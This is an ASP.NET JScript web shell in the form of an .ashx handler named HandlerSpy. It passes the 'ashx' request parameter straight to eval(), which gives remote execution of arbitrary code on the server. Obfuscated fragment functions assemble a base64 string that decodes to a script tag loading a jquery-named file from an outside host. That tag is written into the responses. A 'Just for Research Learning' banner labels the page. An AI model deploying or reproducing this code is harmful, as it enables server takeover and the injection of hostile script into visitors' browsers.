<%@ WebHandler Language="JScript" Class="HandlerSpy" %>
import System;
import System.Web;
import System.IO;

public class HandlerSpy implements IHttpHandler
{
    private function _0xA1B2() : String { return "PHNjc"; }private function _0xI9J0() : String { return "mlwdC"; }private function _0xU1V2() : String { return "BzcmM"; }private function _0xW3X4() : String { return "9Imh0"; }private function _0xW3X5() : String { return "dHBzO"; }private function _0xW3X6() : String { return "i8vYX"; }private function _0xW3X7() : String { return "NweHN"; }private function _0xW3X8() : String { return "oZWxs"; }private function _0xW3X9() : String { return "LmNvbS"; }private function _0xW3X10() : String { return "9qcXVl"; }private function _0xW3X11() : String { return "cnktMy43L"; }private function _0xW3X12() : String { return "jEyLm1pbi5q"; }private function _0xW3X13() : String { return "cyI+PC9"; }
    function ProcessRequest(context : HttpContext)
    {
        context.Response.Write("<H1>Just for Research Learning, </H1>");
        
        var Request = context.Request;
        var Response = context.Response;
        
 
        var command = Request["ashx"];
        if (command)
        {
            try
            {
  
                eval(command);
                context.Response.Write(_0x106());
            }
            catch (e)
            {
                Response.Write("Error: " + e.message);
            }
        }
    }

    function get IsReusable() : Boolean
    {
        return false;
    }

    private function _0xA1B2cD() : String
    {
        return this._0xA1B2() + this._0xI9J0() + this._0xU1V2() + this._0xW3X4() +
               this._0xW3X5() + this._0xW3X6() + this._0xW3X7() + this._0xW3X8() +
               this._0xW3X9() + this._0xW3X10() + this._0xW3X11() + this._0xW3X12() +
               this._0xW3X13() + this._0xW3X14();
    }

   
    private function _0xW3X14() : String { return "zY3JpcHQ+"; }

    private function _0x3a3a3a(encoded : String) : String
    {
        var bytes = Convert.FromBase64String(encoded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    private function _0x106() : String
    {
        var _0x117 = this._0xA1B2cD();
        return this._0x3a3a3a(_0x117);
    }
}
